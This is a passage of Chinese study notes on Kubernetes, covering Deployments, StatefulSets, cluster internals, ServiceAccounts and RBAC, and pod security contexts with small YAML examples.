保留着每一次升级时旧版本的 replicaSet，因此它也可以实现回滚到指定版本的 replicaSet 控制滚动升级速率在更新策略中，有两个属性会影响升级速度 maxSurge：表示允许超出预期副本数的 pod 数量或比例； maxUnavailable：表示允许少于预期副本数的 pod 数量或比例； 暂停和恢复滚动升级 阻止出错版本的滚动升级deployment 有一个 minReadySeconds 属性，它表示 pod 需要就绪一定的时间后，才能继续余下的升级工作，这样的好处是在发现 pod 有错误时，能否阻止错误进一步蔓延扩大到所有的 pod；一般来说它需要配合就绪探针使用； kubectl apply 可以用来更新当前已经创建的资源；如果资源不存在，则它会创建； deployment 有一个 progressDeadlineSeconds 属性，可以用来设置升级的最长时间，如果超过了这个时间，则意味着升级失败，升级操作将会被自动取消； 10. StatefulSet：部署有状态的多副本应用创建有状态 pod使用 replicaSet 创建的多个 pod，它们可以很容易的实现同一个持久卷的共享，但是如果想让每个 pod 拥有自己的持久卷，则无法实现； 有一种解决办法是让每个 replicaSet 只创建一个 pod，多个 pod 将产生个多个的 replicaSet，这样就可以实现每个 pod 有自己的独立存储； 另外，为了实现让每个 pod 都可以访问其他 pod，还需要为每个 pod 创建单独的 service，避免因为 pod 被删除后，重新创建的 pod 使用新的 IP 和名称，导致无法访问； 了解 StatefulSet对比 StatefulSet 和 ReplicaSet由ReplicaSet 创建的 pod，其名称是随机的，每次新建的 pod 的标识都跟之前的不同；它适用于完全无状态的应用，每个应用之间都可以相互替换而不会有影响； 由 StatefulSet 创建的 pod 将拥有唯一的标识和状态，名称是有规律和固定的（按顺序索引编号）；如果某个 pod 挂掉了，StatefulSet 将再创建一个有相同标识的 pod； 提供稳定的网络标识每个 pod 的名称由 StatefulSet 的名称加上索引号来组成；如果某个 pod 挂了，新建的 pod 将仍然使用和之前一样的名称； 当 pod 有了固定的名称后，意味着可以创建基于该名称的服务，然后其他 pod 可以通过它来实现稳定的访问；这么做还可以顺带有一个效果，即通过检查服务的列表后，就可以发现有多少个 StatefulSet 的 pod； StatefulSet 在缩容的时候，假设需要删除多个 pod，它每次只会操作一个，以便确保被删除的 pod 的数据有机会复制保存起来；因此，如果有某个 pod 处于不健康的状态，则此时不允许进行缩容操作，因为它可能会导致数据出现丢失； 为每个有状态实例提供稳定的专属存储就像 StatefulSet 的 pod 与服务一一对应一样，如果需要为pod 提供持久存储，则在模板中同时写出持久卷声明，之后在创建 pod 之前，就会先创建出与 pod 一一对应的持久卷声明；而每个持久卷声明又将会与某个持久卷一一对应； 当 pod 被缩容删除后，它原先绑定的持久卷声明并不会被自动删除，而是会持续保留着，因为里面可能存储着有状态的数据；直到被手工删除为止； StatefulSet 的保障由于 StatefulSet 中的每个 pod 都有唯一标识和存储，因此这意味着 K8s 不应该创建出两个相同的 pod，或者会发生冲突； 使用 StatefulSet创建应用和容器镜像 通过StatefulSet 部署应用一般需要创建三个对象，包括：持久卷（用于存储数据）、Service（用来外部访问）、StatefulSet本身；以下以谷歌的 Kubernetes 集群做为示例。 第1步：先创建磁盘 第2步：创建三个持久卷 第3步：创建 Headless Service 好奇：为什么使用 headless service 可以让 pod 之间彼此发现，而普通的 service 就做不到这点了吗？答：因为普通的 service 会对接请求，然后将请求随机转发至某个 pod，这样会导致 pod 之间不能实现与特定 pod 的通讯，因为普通 service 的转发是随机的；而 headless service 不再直接对接请求，而是让请求直接对接 pod，因此，它可以实现 pod 之间的直接访问；不过，为此付出的代价是，headless service 虽然也叫 service，但实际上并不能仅通过 service 来访问 pod，而是需要 . 这样来访问； 第4步：创建 StatefulSet 由于 statefulset 的 pod 是有状态的，因此在启动 statefulset 时，它们并不是同时启动的，而是按顺序启动，以免引起竞态条件； 使用你的 pod删除 statefulset 中的某个 pod 后，它会被重新创建，但不一定是调度到原来的节点上，有可能会被安排到新的节点上，不过问题不大，因为这个新建的 pod 会使用旧的名称，并且关联原有的旧的持久卷（如有）； 虽然 statefulset 在创建过程中，需要有一个 headless service；但是在 pod 都创建完毕后，也可以额外定义一个 service 来指向这些 pod； 在 StatefulSet 中发现伙伴节点headless service 之所以可以让 pod 之间彼此发现和通信，其原理在于它使用了 DNS 域名系统中的 SRV 记录，它会将请求转发到提供特定服务的那台服务器上面； 问：什么是 SRV？答：DNS 系统中保存着很多域名解析的记录，当收到一个解析请求时，DNS 根据这些记录为请求找到相应的目标 IP 地址；DNS 保存的记录有很多种类型，它们分别适用于不同的解析场景，例如 A记录（指向一个 IPv4地址）、MX记录（指向电子邮件服务器的地址）、CNAME记录（用于将当前域名映射到另外一个域名），以及 SRV记录（指向提供特定服务的服务器的地址）等等；（怎么感觉它跟子域名很像？） 通过 DNS 实现伙伴间彼此发现不同语言的代码都有关于如何做 SRV DNS 查询的实现，只要调用相应的方法，以服务域名作为参数，即可以查询该域名项下的所有的 SRV 记录，从而获得了各个 pod 的访问地址，实现 pod 之间的彼此发现； 更新 Statefulset通过命令 kubectl edit statefulset 可以调用默认的编辑器打开某个资源相应的声明文件，在对其更改并进行保存后，就可以实现对资源的更新； 此处 statefulset 有一个行为和 deployment 不太一样，即当对镜像的版本进行更新后，并不会影响原来已经在运行的容器，只会影响后续新建的容器；如果想让镜像马上得到使用的话，需要搬运删除原来的副本，然后 statefulset 就会根据新的模板创建新的容器；这一点跟 ReplicaSet 一致； 尝试集群数据存储对于 Statefulset 里面的 pod 来说，每个 pod 有自己的独立存储，因此数据事实上是分散在不同的 pod 之间的；通过在应用中调取 SRV 记录，实现对其它的 pod 的访问，可以收集散落在各个 pod 中的数据，统一返回给客户端，这样可以解决数据分散存储的问题，实现访问上的统一； 这种方式的缺点是代码写起来很麻烦，或许可以通过封装一个公用的函数来实现； 了解 StatuefulSet 如何处理节点失效由于 statefulset 中的 pod 是唯一的，这意味着如果调度器在不能明确某个 pod 是否已经失效时，不能随意去创建新的 pod，不然将有可能跟原来的 pod 产生冲突； 模拟一个节点的网络断开断开的命令： sudo ifconfig eth0 down，这个命令运行后，将导致原本进行中的 SSH 连接断开； 当断开网络连接时，pod 实际上是有在运行的，只是不再与调度器通信；调度器在失去该 pod 的通信后，一开始会将它标记为 unknown 状态，并在超过一定的时间后（可配置），会将 pod 从集群中删除掉； 手动删除 pod通过情况下，当通过命令调用 API 服务器来执行某个动作时（例如删除 pod ），API 服务器只是先发了一个删除指令给 kubelet，实际上是由 kubelet 来执行删除动作；在 kubelet 删除成功后，它会发通知给 API 服务器； API 服务器在收到通知后，更新自己的状态记录； 如果不想等待 kubelet 的通知，则可以在删除指令中加上 –force 和 –grace-period 两个参数，直接强制更新状态（一般情况下，最好不要使用这种方法，因为它有可能导致冲突）； 11. 了解 Kubernetes 机理了解架构Kubernetes 组件的分布式特性总共有三种类型的组件，分别是主节点组件、工作节点组件，以及一些提供额外功能的附加组件；所有的组件之间都是通过 API 服务器进行通信； 工作节点上的组件是一个整体，它们需要被安排在同一个节点上才能协同工作，但是主节点上的组件则没有这个要求，它们可以是分布式部署在不同的节点上的，甚至还可以有多个实例（以此来保证高可用性）；不过多出的实例只是作为备用，在某个的时间点，有且只有一个组件在真正的工作； 除了 Kubelet 组件外，其他组件都是做为 pod 来运行的，只有 Kubelet 需要做为常规的系统应用直接部署在节点上，因为总是需要有一个人来完成自举的动作，将其他组件作为 pod 部署在节点上； Flannel pod 据说是用来为 pod 提供重叠网络，啥是重叠网络？ Kubernetes 如何使用 etcd 问：什么是 etcd？ 答：原来它是一个数据库应用，类似 redis，提供 key-value 形式的存储，支持分布式部署，以提供高可用性和更好的性能；它使用乐观并发控制（也叫乐观锁）功能，即为数据提供版本号，在客户端尝试对数据进行修改时，需要提供之前客户端读取的版本号，如果与当前数据库中保存的版本号一致，则允许修改；如果版本号不一致，则拒绝修改请求，并要求客户端重新读取一下最新的数据后，再根据情况重新提交修改请求；etcd 的键名支持斜杠，因此导致键名看起来很像目录名，感觉像是有层级存在一样；键的值是以 JSON 形式存储的； 让所有组件通过 API 服务器来对接 etcd 有两个好处： 只有 API 服务器本身实现了并发控制机制（乐观锁）即可，无须担心直接对接的场景下，有些组件没有遵循乐观锁机制； API 服务器可以增加一层权限控制，确保授权的客户端才能够对数据发起修改； 当存在多个 etcd 实例时，etcd 集群使用 RAFT 算法来保证节点之间数据的一致性；该算法要求集群过半数的节点参与，才能进入下一个状态；这样可以避免某几个实例失联后带来的影响；因此 etcd 的实例数据必须为单数，这样才有可能过半数，避免出现平局的情况； API 服务器做了什么API 服务器以 REST API 的形式，提供了对集群状态进行增删改查 CRUD 的接口； 当客户端（例如 kubectl）向 API 服务器发起请求后，API 服务器在收到请求后，会先根据事先配置好的插件，对请求进行预处理，包括：验证身份（认证类插件）、授权核实（授权类插件）、准入控制（准入类插件）； 请求只有通过了以上所有这些插件的处理后，API 服务器才会验证存储到 etcd 的对象，然后返回响应给客户端； API 服务器如何通知客户端资源变更API 服务器除了做前面提到的那些工作外，其他就没有做其他的；唯一的事项是当资源发生变更时，给之前监听的客户端发送通知；关于资源的创建和维护工作，实际上是由其他组件完成的（例如调度器和 kubelet）； 了解调度器表面上看调度器做的工作很简单，当它监听到 API 服务器关于新建资源的通知后，它就为该资源指定一个节点，然后通知 API 服务器修改资源的定义，加上节点信息；之后 API 服务器会将该信息做为新通知发出来，此时处于监听状态的 kubelet 就会受到通知，然后在其节点上新建相应的资源；建好之后，再发通知给 API 服务器更新资源的状态； 虽然调度器的工作看上去很简单，但其实最难的部分在于如何最高效的调度资源，以便充分利用硬件资源，提高效率；此便会涉及到设计一套高效的调度算法； 调度算法分为两个步骤，第一步是先找出所有可用的节点；第二步是对可用节点进行排序，选择优先级分数最高的节点； 查找节点的工作涉及一系列应满足条件的判断；选择最佳节点则因情况而异，即不同情况下，有不同的优先级标准，例如是高可用性优先，还是成本优先等； 集群中允许有多个调度器，其中有一个会被当作默认调度器；当 pod 没有指定由哪个调度器进行调度时，则由默认的调度器进行调度；不同的调度器可以有不同的调度算法，以实现不同的优先级目标； 了解控制器不管是 API 服务器，或者是调度器，它们都只负责定义状态，而控制器的工作就在于让集群的状态向定义的状态收敛；控制器有很多个，每种资源都有一种相应的控制器； 当监听到 API 服务器关于资源状态的通知后，控制器就会去做实际的资源管理动作（例如新建、修改和删除等，注意：此处仅仅是操作资源，而不是容器），调整资源的最终状态与定义的状态相符，然后将新的资源状态反馈给 API 服务器；之后 API 服务器发布通知，最后由 Kubelet 完成容器级别的操作； Kubelet 做了什么动作一：通知 API 服务器创建一个 Node 资源，以注册其所在的节点； 动作二：持续监听 API 服务器的通知，如果有新消息，就通知容器运行时（例如 Docker），对节点上的容器进行操作； 动作三：当容器启动后，持续监控容器的运行状态、资源消耗、触发事件等； 有意思的是，Kubelet 不但可以从 API 服务器接收消息来创建和管理 pod，也可以从本地的文件目录中导入 pod 定义，来创建和管理 pod，即它是可以脱离 API 服务器独立运行的； Kubernetes Service Proxy 的作用工作节点上除了运行 Kubelet 外，还会运行一个 kube-proxy，它用来确保客户端可以通过 Kubernetes API 连接到节点上的服务； kube-proxy 的名称中之所以带有 proxy 字样，是因为在早期的设计中，它确实扮演着 proxy 的功能，请求会被 iptables 转到它这里，并由它再转发给后端的 pod；但后来这个设计做了改进；kube-proxy 只负责更新 iptables 里面的规则就好，实际请求可以由 iptables 直接转发给 pod，不再经过 kube-proxy，这样可以很好的提高性能； 介绍 Kubernetes 插件除了核心组件外，还有一些插件用来提供额外的功能，例如 DNS 服务器、仪表板、Ingress 控制器等； DNS 插件可以为集群内的所有 pod 提供 DNS 服务，这样 pod 之间就可以使用服务名进行彼此的访问，而无须事先知道对方的 IP 地址是多少，甚至是无头服务的 pod 也可以； Ingress 控制器实现的功能和 DNS 插件差不多，只是实现方式不同，它通过运行一个 nginx 服务器来实现创建和维护规则；相同的部分在于二者都是通过订阅监控 API 服务器的通知来实现更新； 控制器如何协作了解涉及哪些组件当创建一个 deployment 资源时，将会涉及以下这些组件的相互协作 事件链 观察集群事件通过 kubectl get events –watch 命令可以动态的观察集群中发生的事件； 有意思的是，当主节点的组件或者工作节点的 kubelet 执行动作后，需要发送事件给 API 服务器时，它们是通过创建事件资源来实现的，而不是直接调用 API 服务器的接口发送相应的请求（有点意思，为什么要这么做呢？虽然增加了一层抽象后提高了健壮性，不过貌似动作成本也不小）； 了解运行中的 pod 是什么当 kubelet 创建一个 pod 时，它并不仅仅只运行资源定义文件中声明的容器，它还会在 pod 上面运行一个基础容器，它用来保存命名空间，实现一个 pod 上的所有容器共享同一个网络和 Linux 命名空间；这个基础容器的生命周期和 pod 绑定在一起，当 pod 增加运行其他容器时，会从这个基础容器中获得需要的命名空间数据； 跨 pod 网络网络应该是什么样的对于同一个 pod 内部的容器，它们之间实现相互访问是非常简单的，因为它们共享一个网络，因此使用本地网络 localhost 就可以实现相互访问了；但如果想要实现跨 pod 的容器之间的相互访问，就需要一套每个 pod 共用的网络机制，这样才能够让每个 pod 的 IP 地址在这个网络中保持唯一性，让其他 pod 可以使用 IP 地址就可以实现连接，而无需使用 NAT 进行网络地址的转换； Kubernetes 本身只要求通信需要使用非 NAT 网络，但并没有规定这样的一个网络在技术上如何实现，而是交由插件来处理，这意味着可以根据需要，使用不同的网络插件来达到相同的目的； 深入了解网络工作原理同节点 上的 pod 通信假设 pod 是一台虚拟机的话，那么运行 pod 所在的节点有点像是一台物理机；虚拟机内部的容器之间由于共享一个网络，相互通信是很容易的；而对于节点所在这台物理机上面的不同 pod，它们本质上只是基于 Linux 命名空间的虚拟化技术下的一个分组，而节点 host 本身也是一个分组（即另一个命名空间）；分组和分组之间，共享节点上的同一个网络，但是它们的物理网卡接口却只有一个；为了解决这个问题，引入了一个叫做 veth（virtual ethernet）的虚拟网卡，并创建一个 veth 对，其中一个放在虚拟机的命名空间中，一个在物理机的命名空间中，二者之间形成一个管道，可以相互传输数据；同时将物理机的 veth 连接到物理机的网络上，这样就间接可以实现不同分组之间的相互通信了； 不同节点上的 pod 通信对于不同节点之间的通信，由于涉及不同的网卡，开始需要引入交换机或者路由器，此时可以有多种实现方式，例如： underlay：即传统的网络基础结构，每个节点有一个自己的独立物理 IP 地址，因此所有其他节点都可以访问； overlay：在 underlay 的基础上，增加一层逻辑网络（虚拟的），这样就可以脱离 IP 地址的限制，拥有自己独立的 IP 地址空间； 三层路由：节点之间共用一台交换机或者路由器进行连接，由路由器实现转发；此方案比较适合中小型局域网中；如果需要应对复杂的场景，则使用 SDN （软件定义网络）的 overlay 更合适； 引入容器网络接口为了实现容器连接到网络，以便和其他容器互相通信，有一系列的工作需要做，因此 Kubernetes 采用 Container Network Interface 接口来标准化这项工作；CNI 有很多插件实现，包括：Calino、Flannel、Romana 和 WaveNet 等； 服务是如何实现的引入 kube-proxy每个节点上都会运行一个 kube-proxy，和 Service 相关的所有事情，实际上都是由 kube-proxy 进行处理的；虽然 service 对外提供了一个稳定的 IP 地址和端口号，但其实它们都是虚拟的，并不能真正的 ping 通； kube-proxy 在早期版本的时候，确实有发挥代理的作用，对请求进行转发；但现在新的版本中，请求的转发工作是由 iptables 来处理的，kube-proxy 只需负责维护 iptables 的工作了； kube-proxy 如何使用 iptables当创建了一个 service 资源时，API 服务器会给所有的节点发通知，kube-proxy 在收到通知后，就会更新自己负责的 iptables 规则，在上面建立一个映射，将服务的 IP 地址和端口映射到能够真正提供服务的 pod 的 IP 地址和端口；之后如果 iptables 发挥有数据包的目标地址是 service 的地址，它就会按映射表将其替换为实际的 pod 地址，将数据包重定向到 提供服务的 pod； 除了要监控 API 服务器关于 service 变更的通知外，kube-proxy 还需要监控 API 服务器关于 Endpoint 变更的通知；因为 Endpoint 对象中保存着关于提供某个 service 服务的 pod 信息（IP 地址和端口号）； 运行高可用集群使用 Kubernetes 来部署应用的最核心目的，就是减少运维的工作，让应用能够以最简单的方式可靠的运行，因此 Kubernetes 还需要提供一系列的组件来监控各类资源的状态，确保它们在发生故障后，能够被及时处理； 让应用变得高可用方案一：运行多个实例来减少宕机的可能性该方案需要应用本身支持水平扩展；如果不支持，仍然可以使用 Deployment，只需将副本数设置为 1；这样当实例发生故障时，Deployment 会创建一个新的 pod 实例来替换它；当然，由于创建 pod 的过程需要一点时间，因此不可避免会出现一小段的宕机时间； 方案二：对无法实现水平扩展的应用使用领导选举机制 提前创建多个实例，但在某个时刻就有一个在工作，其中实例处于备用状态；当工作中的实例发生故障时，就在备用的实例中选举一个实例成为工作实例； 实例的选举工作可以在不改变原应用代码的情况下实现，即通过创建一个 sidecar 容器来完成领导选举的工作，点击这里查看更多实现代码 让 Kubernetes 主节点变得高可用实现办法：增加多个主节点的实例 etcd 本身就已经是多实例的分布式设计，多个实例之间会自动同步； API 服务器是无状态的，本身不存储任何数据，因此多少个都没有问题； 管理器和调度器需要实施领导推选机制，某个时候有且只一个处于工作的状态，其他实例作为备用；（它的推举机制特别简单，类似乐观锁的机制，当某个实例能够将自己的名字写入指定对象的属性中时，谁就成为领导，剩下的成为备用；领导者默认每2秒钟需要做一次更新资源的动作；其他实例则监控领导者是否定时更新，如果它们发现领导者超过时间没有更新，大家就重新开始竞争将自己的名字写入指定对象的属性； 12. Kubernetes API 服务器的安全防护了解认证机制当请求到达 API 服务器后，API 服务器需要验证该请求是否合法，因此将首先由认证类的插件提取请求中的用户身份，当获得用户的身份信息后，API 服务器就会停止调用剩下的其他插件，直接进入授权插件处理的阶段；常用的认证插件包括： 客户端证书 HTTP 头部中的认证 token 基础的 HTTP 认证 用户和组API 服务器允许被两种类型的用户访问： 一种是机器用户，例如 pod 或者运行在 pod 中的应用； 一种是真人用户，例如开发人员或者运维人员通过 kubectl 客户端发起的请求； 每个用户都属于一个或者多个组，而每个组背后将关联不同的权限；认证插件在认证用户身份后，会返回该用户所属的组名； ServiceAccount 介绍pod 与 API 服务器进行通信时，使用 ServiceAccount 机制来证明自己的身份，它会在请求中附带发送 token；token 的内容是在创建容器时，提前挂载到容器中的某个文件里面； ServiceAccount 本身也是一个资源，跟 pod、secret、configMap 等资源的性质是一样的，因此它们只会作用于某个单独的命名空间，而不是全局有效的； 在一个命名空间中，可以有多个 ServiceAccount 资源；一个 ServiceAccount 资源可以被多个 pod 关联；但一个 pod 不能关联多个 ServiceAccount； 在 pod 的声明文件中，如果不显式的指定 pod 所关联的 ServiceAccount，则 pod 将被关联到其所在的命名空间中的默认的 ServiceAccount；当然，也可以显式的指定要关联的其他 ServiceAccount 名称； 当 pod 关联 ServiceAccount 后，它所能访问的资源，将由 ServiceAccount 来决定了； 创建 ServiceAccount默认的 ServiceAccount 的权限还是很大的，如果让所有的 pod 都使用默认的 ServiceAccount，显然这种做法并不够安全；每个 pod 所能操作的资源应当在不影响其正常工作的范围内，尽可能的小； 通过 kubectl create serviceaccount 命令就可以快速创建一个 ServiceAccount，但是在创建 ServiceAccount 之前，需要创建一个 token（用 Secret 资源来实现），因为创建 ServiceAccount 时，需要引用一个已经提前创建好的 token； 理论上 pod 允许挂载任何的 secret 到其容器中，但是这样有风险，会导致某些 secret 被暴露了；此时可以通过在 ServiceAccount 指定 pod 允许挂载的 secret 列表，来限制 pod 的挂载范围； ServiceAccount 还有一个设置镜像拉取密钥的属性，这个属性不是用来限制可挂载的密钥范围的，而是用来实现挂载镜像拉取密钥的自动化；所有关联该 ServiceAccount 的 pod，都会自动被挂载该镜像拉取密钥，从而能够从私有仓库拉取需要的镜像； 将 ServiceAccount 分配给 pod在 pod 的定义文件中的 spec.serviceAccountName 字段，即可以用来显式的指定 pod 所要关联的 ServiceAccount；该字段的值在 pod 创建后就不能修改了，需要在创建时提前设置好； ServiceAccount 本身并不包含任何的权限功能（除了控制可挂载密钥的范围外），因此如果没有特别的进行设置的话，所有新创建 ServiceAccount 都默认具有全部的资源操作权限；因此它需要配合 RBAC 授权插件一起使用，才能起到控制权限的效果； 通过基于角色的权限控制加强集群安全在早期的 Kubernetes 版本中，由于安全控制做得不够完善，只要在某个 pod 中查找到其所用的 token，就可以实现和 API 服务器的通信，对集群中的资源做任何想做的操作；在 1.8 版本之后，RBAC 插件升级为全局可用并默认开启，它会阻止未授权的用户查看和修改集群的状态； 介绍 RBAC 授权插件背景：API 服务器对外暴露的是 REST 接口，因此用户是通过发送 HTTP 请求调用相应的接口来实现某个操作的；请求由动作+资源名称来组成；基于该背景，RBAC 的控制机制就是检查该请求的动作和资源是否都属于允许操作的范围； RBAC 是基于用户所属的角色来检查用户的授权情况的；一个用户可能对应多个角色，只要某个角色拥有某种资源的某个操作权限，则请求就会得到通过； 介绍 RBAC 资源RBAC 授权规则通过四种资源来实现配置；这四种资源可分为两个组： 角色组：Role、ClusterRole，它们指定了在资源上面可以执行哪些动词；二者的差别在于前者面向命名空间内的资源，后者面向集群级别的资源； 角色绑定组：RoleBinding、ClusterRoleBinding，它们将上述角色绑定到特定的用户、组或者 ServiceAccount 上面； 角色组决定了用户可以做哪些操作，角色绑定组决定了谁可以做这些操作； 虽然 RoleBinding 在命名空间下起作用，不能跨命名空间，但是这并不影响它们引用集群级别的角色，因此集群角色并不属于任何的命名空间； 在启用了 RBAC 插件后，pod 默认绑定的 serviceAccount 并不具备查询或修改集群资源的权限，这样可以最大程度的保证集群的安全性； 使用 Role 和 RoleBinding定义 role 资源的示例 每个资源都属于某个 API 资源组，在声明文件中定义资源的时候，字段 apiVersion 即是指定资源所属的 API 资源组； 复数的资源名称表示可以访问所有的同类型资源，但是也可以通过增加资源名称进一步缩小访问范围； Role 是归属于命名空间的资源，因为不同的命名空间可以拥有相同的 Role 名称，但里面的内容可能不同 在 Kubernetes 中需要通过创建 RoleBinding 资源来实现角色与相关主体（如用户、ServiceAccount、组等）的绑定（这个理念很有意思，有点面向对象的意思，即想要实现的动作，通过创建对象来实现）； 在 GKE 中创建角色之前，需要让当前的客户端账号获取集群管理员的角色，即需要为当前账号创建一个 clusterRoleBinding 资源，来进行集群管理员角色的绑定，示例如下： RoleBinding 只能将单个角色绑定到一个或多个主体上，这些主体可以归属于不同的命名空间；但是不能反过来，即将多个角色绑定到一个或多个主体上； 问：这貌似意味着如果主体需要绑定多个角色，要创建多个 RoleBinding 资源？ 使用 ClusterRole 和 ClusterRoleBinding普通的角色只能访问到自己所处命名空间中的资源；ClusterRole 则可以访问集群级别的资源，或者所有命名空间中的资源（这样可以避免在多个命名空间中定义相同的角色，只需定义一个 ClusterRole 的角色，就可以多次使用了，即被不同命名空间中的 RoleBinding 进行绑定）；至于是哪一种，它是通过绑定过程来实现的；当使用 ClusterRoleBinding 进行绑定的时候，被绑定的主体就可以访问所有命名空间中的资源；当使用 RoleBinding 进行绑定的时候，被绑定的主体则只能访问其所在的命名空间中的资源； 了解默认的 ClusterRole 和 ClusterRoleBindingKubernetes 启动时，即已经内置好了一些常用的 ClusterRole，其中最常用的四个分别是： edit：对命名空间中的资源的修改权（除不允许修改 Role 和 RoleBinding）； view：对命名空间中的资源的读取权（除不能读取 Role、RoleBinding 和 Secret）； admin：对命名空间中的资源的完全控制权（除 ResourceQuota 资源外）； cluster-admin：对整个集群的完全控制权 其中一些 ClusterRole 和相同名称的 ClusterRoleBinding 主要是用来给各种控制组件分配权限的； 理性的授予权限为了安全起见，默认的 ServiceAccount 几乎没有什么权限，连查看集群状态的权限都没有，几乎等于未经认证的用户；但这显然无法应对工作中的需要，好的做法不是给默认 ServiceAccount 添加各种权限，因为它会导致这些权限扩散到那些同样使用默认 ServiceAccount 的 pod 上；而是应该单独给每个需要权限的 pod 创建单独的 ServiceAccount、Role 和 RoleBinding，并在 Role 里面设置所需要的最小权限； 13. 保障集群内节点的网络安全在 pod 中使用宿主节点的 Linux 命名空间背景：宿主节点有自己的默认命名空间，而在节点上运行的每个 pod 也有各自的命名空间；通过命名空间实现了彼此的隔离；这些命名空间包括独立的 PID 命名空间、IPC 命名空间、网络命名空间等； 问：貌似即使是同一 pod 中的容器也有各自的命名空间，那么它们如何实现与 pod 的对应？猜测有可能需要在某个地方进行映射登记； 在 pod 中使用宿主节点的网络命名空间缘起：某些 pod 需要运行在宿主节点的默认网络命名空间中，例如执行系统级功能的 pod（像那些运行 Kubernetes 的控制组件的 pod），这样它们才能够查看和操作节点上的资源和设备； 解决办法：在 pod 的 spec 字段中，启用 hostNetwork: true 选项； 12345678910apiVersion: v1kind: Podmetadata: name: pod-with-host-networkspec: hostNetwork: true containers: - name: main image: alpine command: [&quot;/bin/sleep&quot;, &quot;999999&quot;] 绑定宿主节点上的端口而不使用宿主节点的网络命名空间实现办法：在 spec.containers.ports 下，有一个 hostPort 属性，可以用来设置 pod 端口和节点端口的映射绑定； NodePort 类型的 service 也可以用来做相同的绑定，但是区别在于，它是通过修改 iptables 来实现的映射，并且它会作用在所有节点上的 iptables，不管该节点是否有运行 pod；同时，iptables 的路由是随机的，即当前节点 iptable 有可能将请求转发到节点上，以实现负载均衡； 当使用宿主节点的端口时，将带来一个副作用，因为某个编号的端口在节点上有且仅有一个，这意味着该节点最多运行一个存在这种绑定的 pod；如果所需 pod 副本数大于节点数，将导致部分 pod 一直处于 pending，无法创建成功； hostPort 最初是设计用来给节点上 daemonSet 类型的 pod 暴露端口用的，它恰恰好也兼顾保证了一个 pod 只会被安排在节点一次； 不过据说现在已经有其他更好的实现方法了；是什么呢？ 使用宿主节点的 PID 与 IPC 命名空间跟通过 hostNetwork 属性开启与节点相同网络空间的方法一样，也存在 hostPID 和 hostIPC 选项，可以让容器使用节点上默认的进程命名空间和进程间通信空间；开启后，将可以在容器内看到节点上进行的进程，并可以使用内部进程通信机制与它们进行通信； 1234567891011apiVersion: v1kind: Podmetadata: name: pod-with-host-pid-and-ipcspec: hostPID: true hostIPC: true containers: - name: main image: alpine command: [&quot;/bin/bash&quot;, &quot;999999&quot;] 配置节点的安全上下文容器中的进程常常以 root 身份运行应用，当容器和节点共享命名空间时，意味着有可能存在安全隐患，因此有必要进一步对 pod 对宿主节点的访问权限，进行更细粒度的设置；此时可以通过一个叫做安全上下文（security-context）的选项来实现配置； 使用指定用户运行容器 阻止容器以 root 用户运行 容器以 root 用户运行存在一定的安全隐患，例如当节点上有目录被挂载到容器中时，将使得攻击者有机会访问和修改该目录中的内容； 使用特权模式运行pod有时候根据业务场景需要，不可避免需要让 pod 访问节点上的资源，例如硬件设备、内核功能等；此时需要增加 pod 的权限，让其拥有访问的特权； 为容器单独添加内核功能通过 privileged 开启特权模式并不是好的做法，因为它意味着赋予容器完全的权限，但实际上并不需要那么多，因此需要进一步做更细粒度的配置，仅赋予所需要的个别权限即可； 在容器中禁用内核功能 阻止对容器根文件系统的写入 好的实践：将根文件系统的阻止写入设置为 true，然后为需要写入的数据，例如日志文件、磁盘缓存等单独挂载存储卷； 上述的各个上下文选项是在容器中设置的，但也可以设置在 pod 项下，这样会对 pod 中的所有容器都产生作用，而不局限于单个容器； 容器使用不同用户运行时共享存储卷通过存储卷，可以让两个不同的容器共享数据，例如一个负责写入，一个负责读取；但是这样做的前提是两个容器都以 root 用户来运行；如果不是的话则会出现权限问题，导致共享不成功； 有两个属性可以用来解决这个问题 fsGroup：用来设置 pod 中所有容器在存储卷中创建的文件的所属组别 supplementalGroups：用来给容器中的用户添加新组别 123456789101112131415161718192021222324252627282930apiVersion: v1kind: Podmetadata: name: pod-with-shared-volume-fsgroupspec: securityContext: fsGroup: 555 # 写入存储卷的文件的组别 supplementalGroups: [666, 777] # 用户的其他组别 containers: - name: first image: alpine command: [&quot;/bin/sleep&quot;, &quot;999999&quot;] securityContext: runAsUser: 1111 volumeMounts: - name: shared-volume mountPath: /volume readOnly: false - name: second image: alpine command: [&quot;/bin/sleep&quot;, &quot;999999&quot;] securityContext: runAsUser: 2222 volumeMounts: - name: shared-volume mountPath: /volume readOnly: false volumes: - name: shared-volume emptyDir: 限制 pod 使用安全相关的特性集群中有两种角色，一个是集群的管理员（创建集群资源的人），一个是开发人员（使用集群资源的人）；为了避免开发人员滥用某些功能，例如开启容器的 privilege 权限，导致埋下安全隐患，集群管理员可以通过添加全局设置，来限制部分功能的使用； PodSecurityPolicy 资源介绍PodSecurityPolicy 是一个全局资源，即不属于任何的命名空间，用来限制 Pod 可以开启的安全特性；它需要集群开启 PodSecurityPolicy 插件（负责准入控制）后才能使用；当 API 服务器收到创建 Pod 的请求后，它会调用插件，检查该 Pod 的安全特征是否符合 PodSecurityPolicy 里面规定的要求；如果符合，则开始创建；如果不符合，则拒绝请求； PodSecurityPolicy 能够控制的事情，差不多全部就是上一节提到的那些安全上下文选项，额外还有一项是可以控制 Pod 可以使用的存储卷类型； 了解 runAsUser、fsGroup 和 supplementalGroup 策略对 Pod 可用的用户 ID、用户组 ID 进行限制的示例 PodSecurityPolicy 仅会在创建 Pod 时起作用，如果在创建 PodSecurityPolicy 资源之前， Pod 已经创建了，则已经创建的 Pod 不会受到 PodSecurityPolicy 的影响； 如果创建 Pod 时没有声明用户 ID，则 Pod 创建后，PodSecurityPolicy 会将容器中的用户 ID 强制修改为策略所允许的 ID，即使容器镜像有定义自己的 ID 也一样会被覆盖； 配置允许、默认添加、禁止使用的内核功能通过以下三个字段实现控制： allowedCapabilities defaultAddCapabilities requiredDropCapabilities 对于出现在 defaultAddCapabilities 的功能，将会被自动添加到容器中；如果不希望某个容器拥有该功能，则可以在该 Pod 的声明文件中显式的禁用该功能； 限制 pod 可以使用的存储卷类型 如果集群中存在多个 PodSecurityPolicy ，则容器可以使用的存储卷类型是所有 PodSecurityPolicy 中罗列出的类型的合集； 对不同的用户与组分配不同的 PodSecurityPolicy虽然 PodSecurityPolicy 是集群组别的资源，不归属任何的命名空间，但是它并不会默认对所有命名空间中创建的 pod 生效；它需要被 ClusterRole 引用，然后经由 ClusterRoleBinding 绑定到指定的用户或组之后，才会生效；因此，本质上来说，策略并不针对命名空间，而是针对用户或组的； 隔离 pod 的网络除了上一节提到的可以对 Pod 的安全选项进行配置外，还可以配置 Pod 